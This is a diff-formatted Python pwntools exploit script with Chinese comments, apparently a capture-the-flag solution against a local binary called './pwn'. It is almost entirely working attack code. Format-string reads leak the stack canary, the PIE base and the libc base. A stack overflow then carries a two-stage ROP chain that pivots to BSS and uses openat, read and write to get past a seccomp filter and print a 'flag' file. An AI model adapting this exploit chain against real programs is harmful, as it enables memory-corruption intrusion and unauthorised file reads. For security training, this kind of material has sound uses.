+  - bss 用 0x4100（避开 0x4020/4030/4040 的 stdout/stdin/stderr 指针）
+  - libc 基址：%15$p = puts+346，与版本无关
+  - seccomp 禁 open/execve，orw 走 openat
+"""
+from pwn import *
+import time
+
+context(arch='amd64', os='linux', log_level='debug')
+
+e = ELF('./pwn', checksec=False)
+libc = ELF('./libc.so.6', checksec=False)
+p = process('./pwn')
+
+PREVIEW_RET = 0x1768
+LEAVE_RET   = 0x127b     # 程序自带 leave ; ret
+
+def menu(c):
+    p.recvuntil(b'> ')
+    p.send(c)
+
+def preview(fmt):
+    menu(b'1\n')
+    p.recvuntil(b'format:\n')
+    p.send(fmt + b'\n')
+    return p.recvuntil(b'\n', drop=True)
+
+# ---------- 1. leak canary + PIE ----------
+out = preview(b'%23$p.%25$p')
+canary   = int(out.split(b'.')[0], 16)
+pie_base = int(out.split(b'.')[1], 16) - PREVIEW_RET
+log.success('pie_base = %#x' % pie_base)
+assert pie_base & 0xfff == 0
+
+# ---------- 2. leak libc：%15$p = puts+346 ----------
+puts_ret = int(preview(b'%15$p'), 16)
+libc_base = puts_ret - libc.sym['puts'] - 0x15a
+log.success('libc_base = %#x' % libc_base)
+assert libc_base & 0xfff == 0, 'libc_base 不对齐'
+
+libc.address = libc_base
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
+ret     = rop.find_gadget(['ret']).address
+g = rop.find_gadget(['pop rdx', 'ret'])
+if g:
+    pop_rdx, extra = g.address, 0
+else:
+    g = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
+    assert g, '找不到 pop rdx'
+    pop_rdx, extra = g.address, 1
+log.info('pop_rdi=%#x pop_rsi=%#x pop_rdx=%#x extra=%d ret=%#x'
+         % (pop_rdi, pop_rsi, pop_rdx, extra, ret))
+
+def set_rdx(v):
+    return p64(pop_rdx) + p64(v) + p64(0) * extra
+
+BSS  = pie_base + 0x4100    # 阶段2 ROP 链
+PATH = pie_base + 0x4200    # flag 路径
+OUT  = pie_base + 0x4300    # flag 内容
+
+# ---------- 3. 阶段1：栈上短链，读阶段2到 BSS，再栈迁移 ----------
+stage1  = p64(pop_rdi) + p64(0)
+stage1 += p64(pop_rsi) + p64(BSS)
+stage1 += set_rdx(0x400) + p64(libc.sym['read'])   # read(0, BSS, 0x400)
+stage1 += p64(pie_base + LEAVE_RET)                # leave;ret 跳到 BSS
+
+# saved rbp = BSS-8 → leave;ret 后 rsp=BSS, rip=[BSS]
+payload = b'A' * 0x88 + p64(canary) + p64(BSS - 8) + stage1
+payload = payload.ljust(0x130, b'\x00')            # 正好 0x130，循环一次读完
+menu(b'2\n')
+p.recvuntil(b'payload:')
+p.send(payload)
+
+# ---------- 4. 阶段2：完整 orw 链，写到 BSS ----------
+time.sleep(0.2)
+AT_FDCWD = (-100) & 0xffffffffffffffff
+ALIGN = False   # 若崩在 movaps，改成 True（开头多垫一个 ret）
+
+stage2 = p64(ret) if ALIGN else b''
+stage2 += p64(pop_rdi) + p64(0)
+stage2 += p64(pop_rsi) + p64(PATH)
+stage2 += set_rdx(0x100) + p64(libc.sym['read'])        # read(0, PATH, 0x100) 读"flag"
+stage2 += p64(pop_rdi) + p64(AT_FDCWD)
+stage2 += p64(pop_rsi) + p64(PATH)
+stage2 += set_rdx(0) + p64(libc.sym['openat'])          # openat(-100, "flag", 0)
+stage2 += p64(pop_rdi) + p64(3)
+stage2 += p64(pop_rsi) + p64(OUT)
+stage2 += set_rdx(0x100) + p64(libc.sym['read'])        # read(3, OUT, 0x100)
+stage2 += p64(pop_rdi) + p64(1)
+stage2 += p64(pop_rsi) + p64(OUT)
+stage2 += set_rdx(0x100) + p64(libc.sym['write'])       # write(1, OUT, 0x100)
+
+p.send(stage2)              # 被阶段1的 read(0,BSS,0x400) 接收
+time.sleep(0.2)
+p.send(b'flag\x00')         # 被阶段2第一个 read 接收
+
+p.interactive()
+
+```
 
